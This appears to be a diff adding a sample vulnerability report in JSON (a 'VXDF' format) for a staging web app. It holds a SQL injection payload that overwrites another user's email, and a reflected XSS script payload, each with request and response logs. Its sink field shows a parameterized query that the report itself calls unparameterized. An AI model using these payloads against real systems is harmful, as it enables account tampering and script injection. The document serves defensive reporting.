@@ -1,0 +1,176 @@
+{
+  "vxdfVersion": "1.0.0",
+  "id": "bc9f193c-7e73-4c69-9d44-1b024632b16b",
+  "generatedAt": "2025-05-17T18:30:00Z",
+  "generatorTool": {
+    "name": "AcmeSecurityScanner Suite",
+    "version": "2.5.1"
+  },
+  "applicationInfo": {
+    "name": "Acme WebApp",
+    "version": "v2.3.1-patch2",
+    "repositoryUrl": "https://git.example.com/acme/webapp.git",
+    "environment": "staging",
+    "purl": "pkg:generic/acme/webapp@v2.3.1-patch2"
+  },
+  "exploitFlows": [
+    {
+      "id": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
+      "title": "SQL Injection in User Profile Update",
+      "severity": {
+        "level": "HIGH",
+        "justification": "High severity due to potential for data manipulation and unauthorized access"
+      },
+      "category": "INJECTION",
+      "cwes": [89],
+      "validatedAt": "2025-05-17T14:55:00Z",
+      "source": {
+        "locationType": "WEB_ENDPOINT_PARAMETER",
+        "description": "User ID parameter in profile update endpoint",
+        "uri": "https://staging.acme.example.com/api/profile/update",
+        "symbol": "userId"
+      },
+      "sink": {
+        "locationType": "DATABASE_SCHEMA_OBJECT",
+        "description": "Dynamic SQL query execution without parameterization",
+        "fullyQualifiedName": "user_profiles.update_query",
+        "symbol": "UPDATE user_profiles SET email = ? WHERE id = ?"
+      },
+      "trace": [
+        {
+          "order": 0,
+          "stepType": "SOURCE_INTERACTION",
+          "location": {
+            "locationType": "WEB_ENDPOINT_PARAMETER",
+            "description": "Attacker crafts a POST request with a malicious 'userId' value.",
+            "uri": "https://staging.acme.example.com/api/profile/update",
+            "symbol": "userId"
+          },
+          "description": "Attacker provides malicious input through the userId parameter"
+        },
+        {
+          "order": 1,
+          "stepType": "DATA_PROPAGATION",
+          "location": {
+            "locationType": "SOURCE_CODE_UNIT",
+            "filePath": "src/main/java/com/acme/ProfileController.java",
+            "startLine": 75,
+            "fullyQualifiedName": "com.acme.ProfileController.updateProfile",
+            "description": "The 'userId' parameter is read from the request."
+          },
+          "description": "User input is extracted and passed to update logic"
+        },
+        {
+          "order": 2,
+          "stepType": "SINK_INTERACTION", 
+          "location": {
+            "locationType": "DATABASE_SCHEMA_OBJECT",
+            "description": "The malicious SQL query is executed against the database.",
+            "fullyQualifiedName": "user_profiles.update_query",
+            "symbol": "UPDATE user_profiles SET email = ? WHERE id = ?"
+          },
+          "description": "Unsanitized input reaches SQL execution point"
+        }
+      ],
+      "evidence": [
+        {
+          "evidenceType": "TEST_PAYLOAD_USED",
+          "validationMethod": "DYNAMIC_ANALYSIS_EXPLOIT",
+          "description": "SQL injection payload used to update another user's email address.",
+          "timestamp": "2025-05-17T14:50:00Z",
+          "data": {
+            "payloadContent": "target_user_id' OR '1'='1'; UPDATE user_profiles SET email='attacker@evil.com' WHERE id='1'; --",
+            "payloadEncoding": "plaintext",
+            "targetParameterOrLocation": "POST body: userId"
+          }
+        },
+        {
+          "evidenceType": "HTTP_REQUEST_LOG",
+          "validationMethod": "DYNAMIC_ANALYSIS_EXPLOIT",
+          "description": "HTTP POST request demonstrating the SQL injection attempt.",
+          "timestamp": "2025-05-17T14:50:05Z",
+          "data": {
+            "method": "POST",
+            "url": "https://staging.acme.example.com/api/profile/update",
+            "headers": [
+              {"name": "Content-Type", "value": "application/x-www-form-urlencoded"},
+              {"name": "Authorization", "value": "Bearer abc123"}
+            ],
+            "body": "userId=target_user_id'%20OR%20'1'='1';%20UPDATE%20user_profiles%20SET%20email='attacker@evil.com'%20WHERE%20id='1';%20--&email=test@example.com",
+            "bodyEncoding": "form_urlencoded"
+          }
+        },
+        {
+          "evidenceType": "HTTP_RESPONSE_LOG",
+          "validationMethod": "DYNAMIC_ANALYSIS_EXPLOIT", 
+          "description": "Server response confirming the SQL injection succeeded.",
+          "timestamp": "2025-05-17T14:50:06Z",
+          "data": {
+            "statusCode": 200,
+            "headers": [{"name": "Content-Type", "value": "application/json"}],
+            "body": "{\"status\":\"success\",\"message\":\"Profile updated\",\"rows_affected\":2}",
+            "bodyEncoding": "json"
+          }
+        }
+      ]
+    },
+    {
+      "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+      "title": "Reflected Cross-Site Scripting (XSS) in Search Function",
+      "severity": {
+        "level": "MEDIUM",
+        "justification": "Medium severity due to potential for session hijacking and content manipulation"
+      },
+      "category": "CROSS_SITE_SCRIPTING",
+      "cwes": [79],
+      "validatedAt": "2025-05-17T15:10:00Z",
+      "source": {
+        "locationType": "WEB_ENDPOINT_PARAMETER",
+        "description": "Search query parameter",
+        "uri": "https://staging.acme.example.com/search",
+        "symbol": "query"
+      },
+      "sink": {
+        "locationType": "USER_INTERFACE_ELEMENT",
+        "description": "HTML response body where user input is reflected",
+        "uri": "https://staging.acme.example.com/search"
+      },
+      "evidence": [
+        {
+          "evidenceType": "TEST_PAYLOAD_USED",
+          "validationMethod": "MANUAL_PENETRATION_TESTING_EXPLOIT",
+          "description": "XSS payload used in the 'query' parameter.",
+          "timestamp": "2025-05-17T15:08:00Z",
+          "data": {
+            "payloadContent": "<script>alert('XSS_VXDF_Proof')</script>",
+            "payloadEncoding": "plaintext",
+            "targetParameterOrLocation": "URL query parameter 'query'"
+          }
+        },
+        {
+          "evidenceType": "HTTP_REQUEST_LOG",
+          "validationMethod": "MANUAL_PENETRATION_TESTING_EXPLOIT",
+          "description": "HTTP GET request with the XSS payload.",
+          "timestamp": "2025-05-17T15:08:05Z",
+          "data": {
+            "method": "GET",
+            "url": "https://staging.acme.example.com/search?query=%3Cscript%3Ealert('XSS_VXDF_Proof')%3C/script%3E",
+            "headers": []
+          }
+        },
+        {
+          "evidenceType": "HTTP_RESPONSE_LOG",
+          "validationMethod": "MANUAL_PENETRATION_TESTING_EXPLOIT",
+          "description": "HTTP response showing the payload reflected in the HTML body.",
+          "timestamp": "2025-05-17T15:08:06Z",
+          "data": {
+            "statusCode": 200,
+            "headers": [{"name": "Content-Type", "value": "text/html"}],
+            "body": "<html>...<h2>Search Results for: <script>alert('XSS_VXDF_Proof')</script></h2>...</html>",
+            "bodyEncoding": "html"
+          }
+        }
+      ]
+    }
+  ]
+} 
